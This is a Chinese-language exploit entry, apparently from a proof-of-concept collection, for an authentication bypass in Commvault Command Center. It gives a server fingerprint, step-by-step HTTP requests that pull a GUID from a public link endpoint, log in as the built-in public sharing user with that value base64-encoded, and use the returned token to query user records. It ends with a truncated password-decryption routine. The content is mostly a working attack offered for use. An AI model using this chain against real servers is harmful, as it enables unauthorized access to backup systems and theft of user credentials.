# Commvault存在权限绕过漏洞

- **系统**：Commvault　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`"Server: Commvault"`
- **请求**：`GET /commandcenter/publicLink.do HTTP/1.1`

**请求体 / payload**
```
取出cv-gorkha，这里的值为GUID
Step2 使用默认账号登录
Password中的值为step1取出的cv-gorkha的值并进行了base64编码
POST /commandcenter/api/Login HTTP/1.1
Host:
Content-Type: application/json;charset=UTF-8
Content-Length: 117
"username": "_+_PublicSharingUser_",
"password": "QjY5NzI1QjEtNTRDOS00NkM3LUFBNEMtRDhDQjRFMThERDg5"
此时回显的便为token，此时token为低权限数据权限
Step3 提权
Authtoken为step2返回值
GET /commandcenter/RestServlet/Database/GetUmUserById/1 HTTP/1.1
Host:
Authtoken: QSDK 3ce4460b10eb59af4c6db51bd02caf897deb8ec229277d62336db2bf6f5a3a8582112e314165be5bf6ce9eeb5d990302375ac4c6dd2a09685b1cf29b3441d9b47cf0fe59cc0275eb9e741bcc7e08256483201…（脚本共 868 字，完整版见原文）
```
- **预期**：200　|　—

**其他**
- Decrypt: | public int DecryptPassword(string encrypted, ref StringBuilder sb, int length)<br/>{<br/>	string encrypted2 = encrypted.Remove(0, 1);<br/>	if (encrypted.StartsWith("2"))<br/>	{<br/>		if (encrypted.Length > 1)<br/>		{<br/>			CVCoderHeader cvcoderHeader = new CVCoderHeader();<br/>			string text = "";<br/>			cvcoderHeader.csldecfld(encrypted.Substring(1), ref text);<br/>			for (int i = 0; i < text.